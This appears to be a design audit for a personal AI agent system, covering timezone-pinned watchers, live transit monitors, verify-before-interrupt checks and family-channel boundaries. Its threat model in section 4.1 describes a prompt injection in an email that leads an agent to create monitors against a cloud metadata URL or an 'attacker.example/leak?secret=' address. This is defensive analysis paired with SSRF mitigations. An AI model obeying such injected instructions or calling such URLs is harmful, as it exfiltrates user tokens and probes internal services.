# 26 — Forensic Audit: Live External Monitors, Active Timezone Resolution, Verify-Before-Interrupt Corroboration & Family Channel Boundaries

> **Status:** Complete (Phase 1 Research Audit — Feeds [RFC-0031](../design/0031-live-monitors-and-verify-before-interrupt.md))
> **Scope:** Empirical field comparison between a two-stage live baseline-diff proactive agent workflow (observed in Meta Muse) and `agy-hq` (`origin/main` post-[RFC-0027](../design/0027-muse-proactive-actions.md), [RFC-0029](../design/0029-rsi-v2-trace-eval-and-heldout-ratchet.md), and [RFC-0030](../design/0030-console-ux-token-audit.md)).
> **Privacy Note:** All field incident timelines and fixtures below are anonymized using synthetic routes, service IDs, and domains while preserving the exact failure mechanics and timestamps (`offset` relationships).

---

## 1. Executive Summary

Following the rollout of [RFC-0027](../design/0027-muse-proactive-actions.md) (Proactive Actions v3 — 0-token `hq pulse` `D1`–`D10`, 3-state Goal checklists, `3m` burst coalescing, 1-tap `DecisionOption` cards, and interactive Living Spaces), real-world travel and mobile usage surfaced **three distinct failure modes** where a lightweight two-stage proactive watcher caught decision-changing events that `agy-hq` missed, while `agy-hq` simultaneously emitted a false-positive interrupt for an already-resolved failure:

1. **Home-Timezone Blind Spot:** `agy-hq`'s inbox watcher (`gmail-inbox-watch`), Morning Brief (`morning-brief`), and `attention.quiet_hours` remained pinned to the user's home timezone (`UTC-8`) while the user was traveling `+8h` ahead (`UTC+0`). For **9 consecutive waking hours** (`06:00–15:00` local daytime), background inbox triage was asleep — missing both a mid-afternoon rail cancellation (`14:35` local = `06:35` home) and delaying a morning payment alert by nearly 4 hours.
2. **No Ephemeral, Goal-Bound Live External Pollers:** `agy-hq` can poll authenticated mail/chat connectors (`hq watch`) and inspect local Vault state (`hq pulse`), but has **no 0-token daemon primitive** for short-lived, auto-expiring external HTTP/API monitors bound to an active Goal or itinerary leg (e.g., live rail/flight status boards, production deploy rollouts, or statuspage incident feeds). Chat-session `schedule` crons burn LLM tokens on every unchanged tick and do not survive session churn cleanly.
3. **Missing "Verify-Before-Interrupt" Corroboration & Baseline-After-Delivery Discipline:**
   - A rideshare payment-failure email (`USD 12.53`) sat unpolled for 4 hours and then fired an immediate `interrupt` without checking whether a follow-up paid receipt had arrived; when the settled receipt arrived 21 minutes later, it was silently logged to `silent_ledger` with zero reconciliation back to the open interrupt.
   - In live multi-source transit monitoring, destination arrival boards frequently lag behind origin/intermediate station departure boards (e.g., a stale `19:30` destination snapshot conflicting with a fresher `19:44` intermediate board). Without explicit `source_updated_at` freshness comparison and pre-delivery re-verification, agents either alert on stale ETAs or repeat unchanged alerts.
4. **Off-Channel Family / External Coordination Blind Spot:** Real-world schedule changes (e.g., a partner rebooking a cancelled train or shifting dinner plans) frequently arrive in personal messaging apps (WhatsApp, Messenger, iMessage, SMS) outside Gmail and Google Chat. Naively scraping those apps or piping third-party chats into `[HQ] Front Desk` would break `agy-hq`'s Ring-0 Lethal Trifecta isolation.

---

## 2. Anonymized Field Case Studies

### 2.1 Incident A — Live Rail Disruption, Rolling ETA Drift & Multi-Source Conflict

**Context:** User is traveling in `UTC+0` (`+8h` ahead of home `America/Los_Angeles` `UTC-8`) with a tracked multi-day trip plan and a `17:00 local` express rail leg (`Service 1A24`, Origin → Destination, scheduled arrival `21:11 local`).

| Time (Local `UTC+0`) | Time (Home `UTC-8`) | Real-World Event | Two-Stage Proactive Monitor Behavior | `agy-hq` Behavior Today |
|---|---|---|---|---|
| `14:35` | `06:35` | `17:00` Service `1A24` cancelled by rail operator | Background monitor polls live departure board, diffs vs. saved baseline (`on_time` → `cancelled`), re-verifies live, emits immediate urgent alert, advances baseline on send | **Missed completely.** `gmail-inbox-watch` (`CRON_TZ=America/Los_Angeles */15 7-22 * * *`) is asleep until `07:00` home (`15:00` local); no live external rail monitor exists |
| `15:30` | `07:30` | Travelers have already switched to earlier `16:30` Service `1A23` | Baseline updated to track `1A23`; unchanged polls remain 100% silent | `morning-brief` fires at `15:30` local afternoon and still lists the cancelled `17:00` Service `1A24` |
| `19:15–19:45` | `11:15–11:45` | `1A23` suffers mechanical fault at intermediate `Station B` (Platform 3); ETA slips `21:02 → 21:24 → ~21:52 → ~21:59` | Periodic diff detects material ETA jumps (`>= 10m`). Re-verify stage detects conflict: Destination board (`19:30` snapshot) still reports `21:24`, while `Station B` board (`19:44` snapshot) reports `~21:52`. Prefers fresher `19:44` source, alerts once per material jump, updates baseline only after send | **Zero visibility.** No ephemeral external poller exists in `hq daemon`; `hq pulse` only inspects local Vault files and calendar cache |
| `20:00–21:45` | `12:00–13:45` | ETA stabilizes within `±3m` | Completely silent (below material delta threshold; baseline matches) | N/A |

**Key Workflow Mechanics Observed (5-Point Reference Pattern):**
1. **Explicit Scope Only:** Watch only explicitly tracked Goals, itinerary legs, or operational targets — never opportunistically scrape arbitrary user history.
2. **Urgent vs. Daytime Split:** Surface decision-changing diffs (cancellations, major ETA slips, platform/gate changes, outage transitions) immediately; batch minor/non-urgent items to daytime; skip already-handled or expired items.
3. **2-Stage Architecture (`Diff → Re-Verify`):**
   - *Stage 1 (Background 0-token diff):* Poll live source(s), compare against last-delivered baseline, emit timestamped, source-attributed candidate alerts only on material delta.
   - *Stage 2 (Pre-interrupt re-verify):* Before interrupting the user, re-fetch live sources (cross-checking a secondary source on conflict and preferring the fresher `source_updated_at` timestamp, e.g., `19:44` over `19:30`) or corroborate against follow-up receipts/events.
4. **Commit Baseline Only After Delivery:** Never advance the alerted baseline until delivery succeeds (prevents lost alerts on transient delivery failure and guarantees zero duplicate nags once delivered).
5. **100% Silence When Unchanged:** Unchanged ticks emit zero messages and burn `0` LLM tokens.

---

### 2.2 Incident B — Delayed Polling & False-Positive Payment Failure Interrupt

**Context:** Same `+8h` travel offset. A rideshare trip completes at `11:09 local`, mobile-wallet settlement initially fails at `11:10 local`, and the user later resolves payment.

| Time (Local `UTC+0`) | Time (Home `UTC-8`) | Event | `agy-hq` Behavior Today | Root Cause |
|---|---|---|---|---|
| `11:10` | `03:10` | Rideshare `"payment failed (USD 12.53)"` email arrives in Gmail | Unpolled (`gmail-inbox-watch` asleep in home TZ `22:00–07:00`) | Gap 1 (Static `CRON_TZ`) |
| `15:01` | `07:01` | First `gmail-inbox-watch` tick of the day runs; `inbox-triage` processes the **3h51m-old** failure email | Fires immediate `tier: "interrupt"` (`Uber payment failed — action required`) with **zero** corroboration check for newer receipts/threads, and `coalesce_window: "0s"` on migrated Vaults | Gap 1 + Gap 3 (No pre-interrupt corroboration) |
| `15:22` | `07:22` | Settled rideshare receipt (`USD 12.53`) arrives in Gmail | On `15:31` tick, classified as `tier: "silent_ledger"` (`incidentKey: "uber-receipt"`), completely unlinked from the `15:01` interrupt (`incidentKey: "uber-payment-failed-..."`) | Gap 3 (No late-arrival auto-reconciliation across opposing polarity) |

**Work-Domain Parallel:** The exact same pattern hits engineering workflows: a transient CI flake or cloud billing pre-auth failure email arrives, fires an immediate `interrupt` during a focus block, and is followed 90 seconds later by `"Build Passed"` or `"Payment Succeeded"` — leaving a stale failure interrupt on the user's Front Desk and Console.

---

### 2.3 Incident C — Off-Channel Family & Partner Plan Changes

**Context:** During group travel or family logistics, a partner receives a carrier SMS or rebooks tickets directly and shares the new departure time (`16:30` Service `1A23`) in a family chat app (WhatsApp, Messenger, or iMessage) rather than Gmail or Google Chat.

- `agy-hq` never sees the update unless the user manually types it into Front Desk.
- Yet simply adding a logged-in headless browser scraper for Messenger/WhatsApp or routing third-party group messages into RFC-0023's privileged Front Desk bridge would violate `agy-hq`'s core Ring-0 security model ([RFC-0003](../design/0003-approval-bound-execution.md), [RFC-0026](../design/0026-declarative-scoped-delegates.md) `NI-1`–`NI-4`).

---

## 3. Ground-Truth Codebase Audit (`origin/main`)

An inspection of the current `agy-hq` codebase reveals that **most foundational seams already exist** — the four gaps are concrete wiring and boundary omissions rather than missing infrastructure:

| Gap | Existing Primitive in `origin/main` | Exact Defect / Missing Capability |
|---|---|---|
| **1. Timezone Blind Spot** | `internal/kernel/goals.go` (`Goal.WindowStartAt`, `Goal.WindowEndAt`, `Goal.Timezone`, `Goal.BlocksAvailability`); `internal/kernel/gatekeeper.go` (`MatchesCron`); `internal/outbox/outbox.go` (`InQuietHours`, `MatchesScopeSchedule`) | 1. `MatchesCron()` parses only a static `CRON_TZ=<IANA>` prefix from `triggers.yaml` — it never consults active `Goal.Timezone` or an active travel TZ override.<br>2. `InQuietHours()` reads only static `attention.quiet_hours.tz`.<br>3. Living Spaces (`internal/living/`) can be created with `countdownAt` and trip dates without creating a linked timezone-bearing `Goal`, so the daemon never knows the user is in `Europe/London`. |
| **2. Ephemeral Live External Pollers** | `cmd/hq/ops_cli.go` (`fastTicker` 15s, `cronTicker` 30s, `pulseTicker` 15m, `hbTicker` 30m); `internal/timers/timers.go` (one-shot `Timer`); `internal/connector/jsonmap.go` (RFC 6901 JSON-Pointer mapper); `internal/extension/trust.go` (`VerifyTrustedBinary`); `internal/living/datasource.go` (`hq_builtin` + `trusted_argv`) | 1. No `internal/monitors/` package or store (`store.RankMonitors`) for auto-expiring, recurring, 0-token HTTP/API pollers bound to Goals.<br>2. No SSRF-safe pure-Go HTTP fetcher with post-DNS IP validation and `monitors.allowed_hosts` allowlist.<br>3. No structured baseline-diff engine (`DeltaPolicy`), no multi-source `source_updated_at` freshness conflict resolver, and no commit-baseline-after-delivery hook. |
| **3. Verify-Before-Interrupt Corroboration** | `internal/outbox/dispatcher.go` (`DispatchPendingInterrupts` 3-phase lock-safe pipeline: Phase A claim under `RankOutbox`, Phase B unlocked delivery, Phase C commit); `internal/outbox/outbox.go` (`EntityKey`, `State`, `AvailableForDispatchAt`, `titlePolarity`, `CoalesceWindow`); `templates/connectors/gmail/connector.json` (`search` verb) | 1. Phase B of `DispatchPendingInterrupts` jumps directly from claimed item to `deliverFn` — there is no `VerifyFunc` pre-dispatch corroboration stage.<br>2. Legacy migrated Vaults kept `coalesce_window: "0s"` (whereas `templates/config.yaml` defaults to `"3m"`), so even fresh transient failure alerts dispatch immediately with no hold window.<br>3. `outbox.Add()` prevents opposing-polarity collisions (`fail` vs `pass`), which is right for avoiding false dedupe, **but** does not auto-reconcile a newly arrived resolution receipt (`paid`/`recovered`) against an open/recent negative interrupt. |
| **4. Inbound Family / External Channels** | `internal/channels/` (RFC-0023 `hq-channel-bridge/v1` — 1:1 owner <-> Front Desk); `internal/connector/` (RFC-0017a `hq-connector-protocol/v1` — tainted read-only `poll` + `read_quarantined`); `internal/delegates/` (RFC-0026 `hq-delegate-transport/v1` — scoped peer delegates with CaMeL `queue_only` nudges); `internal/authz/authz.go` (8-profile lattice) | 1. No documented architectural boundary or starter guide distinguishing **Owner Bridge (RFC-0023)** vs. **Tainted Family/Group Passive Connector (RFC-0017a)** vs. **Trusted Partner Scoped Delegate (RFC-0026)** vs. **Zero-Infra Owner-Forward / ICS Feed**.<br>2. No lightweight `hq goals update-leg` / `hq space note` fast-path or read-only `.ics` calendar URL monitor for zero-infra schedule ingestion from arbitrary messaging apps. |

---

## 4. Security & Architectural Threat Analysis

Designing live external pollers, pre-interrupt corroborators, and family-channel ingestion introduces four high-stakes risks that RFC-0031 must eliminate mechanically in Ring-0 Go:

### 4.1 SSRF & Data Exfiltration via Live HTTP Monitors
- **Threat:** A prompt injection inside a quarantined email tricks an agent into running `hq monitor add --url="http://169.254.169.254/latest/meta-data/..."` or `https://attacker.example/leak?secret=...` to probe internal loopback services (`127.0.0.1:4242` HQ Console!) or exfiltrate Vault tokens via URL query parameters.
- **Required Ring-0 Mitigations:**
  1. **Taint Denial:** `internal/authz` + `PreToolUse` hard-block `hq monitor add` / `edit` in `quarantined_reader` and `scoped_delegate` profiles (tainted sessions can never arm outbound pollers).
  2. **Post-DNS IP Firewall (`DialContext`):** Resolve DNS first, inspect every returned IP, and reject loopback (`127.0.0.0/8`, `::1`), RFC1918 private (`10/8`, `172.16/12`, `192.168/16`), link-local / cloud metadata (`169.254/16`, `fe80::/10`), and ULA (`fc00::/7`) addresses on both initial requests and HTTP redirects (`CheckRedirect` re-validates every hop and caps at 3 hops).
  3. **Explicit Host Allowlist (`monitors.allowed_hosts` in `<vault>/config.yaml`):** Fail closed by default — `http_json` monitors may only target HTTPS hosts explicitly allowlisted in `<vault>/config.yaml` (or approved via interactive `ask_question` / CLI confirmation that appends to `monitors.allowed_hosts`).
  4. **Tainted Output Quarantine:** External HTTP monitor payloads are always untrusted data — extracted fields pass through `outbox.SanitizeAntiCue`, length caps, and `Tainted: true` (or strict schema-only scalar fields: `status`, `eta`, `delay_minutes`, `location`, `source_updated_at`) so no remote server can inject executable commands or spoof `Critical: true` quiet-hour bypasses without an explicit owner-configured `allow_critical_on_status` list (e.g., `["cancelled", "outage"]`).

### 4.2 Lock-Hierarchy & Deadlock Safety
Current lock ranks in `internal/store/store.go`:
```
RankExtensions(10) < RankTriggerCur(20) < RankWatcher(30) < [RankMonitors(31)] < RankPulse(32)
  < RankTimers(35) < RankEvents(40) < RankGoals(50) < RankOutbox(60)
  < RankChannels(65) < RankDelegates(66) < RankTaint(70) < RankTasks(75)
  < RankWorkspaces(76) < RankLivingSpaces(77) < RankMemory(78) < RankSubagentQueue(80) < RankQuota(85)
```
- Placing `RankMonitors = 31` strictly between `RankWatcher (30)` and `RankPulse (32)` — and enforcing **snapshot-then-commit** (never holding `RankMonitors` across network I/O or `RankOutbox` calls, and never holding `RankOutbox` during Phase B `VerifyFunc` re-fetches or connector queries) — preserves strict total lock ordering with zero deadlock paths.

### 4.3 Corroboration Latency & Fail-Open vs. Fail-Closed Trade-Off
- **Threat:** If a pre-interrupt corroboration query hangs or returns a transient network error (e.g., offline airplane Wi-Fi or slow Gmail API), silently dropping a real urgent alert is worse than a false positive.
- **Mitigation:** Bound every corroboration call strictly (`5s` timeout, max `10` items). If corroboration confirms resolution → downgrade to `silent_ledger`. If corroboration errors or times out → **fail-open to delivery** with an explicit provenance footnote (`"(corroboration unavailable; showing HH:MM snapshot)"`).

### 4.4 Family Channel Lethal Trifecta Analysis

| Approach | Reads Untrusted Third-Party Messages? | Touches Privileged Vault / Tools? | Verdict |
|---|---|---|---|
| Headless browser scraper on Messenger / WhatsApp | Yes | High (shared cookies / DOM breakage / ToS + 2FA) | **Reject** |
| Piping family group chat into RFC-0023 `HandleInbound` | Yes | **YES (Critical Breach — Front Desk is `IngressOwnerInteractive`)** | **Reject (Ring-0 Violation)** |
| Companion `hq-connector-protocol/v1` read-only pack (`poll` + `read_quarantined`) | Yes | **No** (`quarantined_reader`, `tainted: true`, `allow_tainted_create: false`) | **Recommended (Opt-In Pack)** |
| RFC-0026 Scoped Delegate (`hq-delegate-transport/v1` + `caller_groups.family`) | Yes (allowlisted family callers only) | **No** (`scoped_delegate`, curated `Public Status` + CaMeL `queue_only` typed nudges) | **Recommended (Trusted Partner)** |
| Owner-Forwarded Note / Shared Read-Only `.ics` Feed | Owner-curated or read-only calendar | Owner-interactive (`IngressOwnerInteractive`) or schema-bounded monitor | **Recommended (Zero-Infra Baseline)** |

---

## 5. Research Conclusions & Recommendations for RFC-0031

1. **Unify Active Timezone Resolution First (Highest Immediate Leverage):** A single pure-Go `ResolveActiveTimezone()` helper wired into `MatchesCron()`, `InQuietHours()`, and `Morning Brief` eliminates the entire 9-hour travel blind spot with zero external dependencies and minimal code footprint.
2. **Add 0-Token Ephemeral Live Monitors (`internal/monitors/`) as a First-Class Primitive:** Pair a stdlib `http_json` monitor (SSRF-hardened, JSON-Pointer mapped, host-allowlisted) with a SHA-256-pinned `hq-monitor-provider/v1` companion pack seam so OSS `agy-hq` stays vendor-neutral while users can plug in any transit, flight, deploy, or incident board.
3. **Wire a 2-Stage Verify-Before-Interrupt Hook into `DispatchPendingInterrupts` Phase B:** Support both live monitor re-verification (with `source_updated_at` freshness conflict resolution and baseline-commit-after-delivery) and 0-token connector corroboration for payment/CI/security failure alerts, plus late-arrival auto-reconciliation in `outbox.Add()`.
4. **Keep Family Channels Strictly Outside RFC-0023 Owner Control:** Reuse the existing RFC-0017a quarantined connector and RFC-0026 scoped delegate seams for opt-in third-party family messaging, complemented by a zero-infra owner-forward fast-path and read-only `.ics` monitor.
5. **Preserve Strict Two-Layer Hygiene:** Keep `go.mod` at `0` external dependencies, keep all personal allowlists/routes/family packs in `<vault>/`, and place new code in dedicated packages (`internal/monitors/`, `internal/kernel/timezone.go`, `internal/outbox/corroborate.go`, `cmd/hq/monitors_cli.go`) to stay well under `H5-F` monolith LOC ceilings.
